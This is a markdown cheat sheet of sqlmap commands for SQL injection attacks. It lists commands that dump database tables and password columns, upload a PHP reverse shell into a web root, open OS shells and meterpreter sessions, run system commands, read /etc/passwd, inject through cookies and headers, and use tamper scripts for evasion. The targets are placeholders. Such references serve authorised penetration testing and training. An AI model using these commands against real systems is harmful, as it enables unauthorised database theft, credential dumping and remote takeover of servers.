```markdown
# SQLMap Commands

## Sample Command
```bash
sqlmap -r sqlfile -p paramToAttack --dbms mysql --users --passwords --batch --technique=QT --not-string=SQL-ERR --flush-session --proxy=http://127.0.0.1:8080
```

## List databases
```bash
sqlmap -r sqlfile --batch --dbs
```

## List databases and table names
```bash
sqlmap -r sqlfile --batch --dbs --tables
```

## Dumps entire UserDetails table in the users database
```bash
sqlmap -r sqlfile --batch -D users -T UserDetails --dump
```

## Dumps the password column from the UserDetails table in the users database
```bash
sqlmap -r sqlfile --batch -D users -T UserDetails -C password --dump
```

## Upload a reverse shell file to a target.
```bash
sqlmap -r file --dbms mysql --risk=3 --file-dest="/var/www/html/cmd.php" --file-write="/home/kali/php-reverse-shell.php" --batch
```

## Gain mysql shell on the server
```bash
sqlmap -r file --dbms mysql --risk=3 --os-shell --batch
```

```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
    B: Boolean-based blind
    E: Error-based
    U: Union query-based
    S: Stacked queries
    T: Time-based blind
    Q: Inline queries
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```

## Inside cookie
```bash
sqlmap -u "http://example.com" --cookie "mycookies=*"
```

## Inside some header
```bash
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"
```

## PUT Method
```bash
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
```

## Indicate string when injection is successful
```bash
--string="string_showed_when_TRUE"
```

## Exec command
```bash
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami
```

## Simple Shell
```bash
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell
```

## Dropping a reverse-shell / meterpreter
```bash
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```

## Read File
```bash
--file-read=/etc/passwd
```

## Second Order Injection
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

## Set a suffix
```bash
python sqlmap.py -u "http://example.com/?id=1" -p id --suffix="-- "
```

## Prefix
```bash
python sqlmap.py -u "http://example.com/?id=1" -p id --prefix="') "
```

## Tamper - In kali you can see all the tampers in /usr/share/sqlmap/tamper
```bash
--tamper=name_of_the_tamper
```
```
